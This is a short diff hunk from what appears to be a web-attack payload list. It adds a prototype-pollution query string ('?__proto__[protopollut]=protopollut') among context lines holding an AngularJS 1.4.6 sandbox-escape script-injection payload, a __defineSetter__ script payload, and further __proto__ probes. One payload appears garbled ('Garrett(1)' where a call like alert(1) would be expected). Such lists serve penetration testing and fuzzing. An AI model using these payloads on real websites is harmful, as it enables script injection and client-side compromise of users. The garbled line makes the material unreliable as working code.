@@ -13,6 +13,7 @@
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
 <script>[{'a':object.prototype.__definesetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
 ? $$watchers[0].get(tostring.constructor.prototype)
+?__proto__[protopollut]=protopollut
 __proto__
 __proto__ stored js alert
 __proto__[test]=test
